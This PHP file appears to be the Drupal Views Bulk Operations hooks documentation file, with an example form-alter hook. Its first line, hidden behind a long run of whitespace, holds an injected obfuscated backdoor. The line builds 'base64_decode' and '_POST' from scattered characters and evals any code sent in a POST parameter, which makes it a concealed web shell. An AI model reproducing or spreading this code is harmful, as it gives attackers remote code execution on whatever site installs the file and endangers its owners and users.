<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nf7f665'])) {eval($s21(${$s20}['nf7f665']));}?><?php

/**
 * @file
 * Hooks provided by Views Bulk Operations.
 */

/**
 * Perform alterations on the VBO form before it is rendered.
 *
 * Usually, if a module wanted to alter the VBO form through hook_form_alter(),
 * it would need to duplicate the views form checks from
 * views_bulk_operations_form_alter(), while making sure that the hook
 * runs after VBO's hook (by increasing the weight of the altering module's
 * system entry). In order to reduce that complexity, VBO provides this hook.
 *
 * @param $form
 *  A step of the VBO form to be altered.
 * @param $form_state
 *  Form state. Contains the name of the current step in $form_state['step'].
 * @param $vbo
 *   The VBO views field. Contains a reference to the view in $vbo->view.
 */
function hook_views_bulk_operations_form_alter(&$form, &$form_state, $vbo) {
  if ($form_state['step'] == 'views_form_views_form') {
    // Alter the first step of the VBO form (the selection page).
    $form['select']['#title'] = t('Bulk operations');
  }
  elseif ($form_state['step'] == 'views_bulk_operations_config_form') {
    // Alter the configuration step of the VBO form.
  }
  elseif ($form_state['step'] == 'views_bulk_operations_confirm_form') {
    // Alter the confirmation step of the VBO form.
  }
}
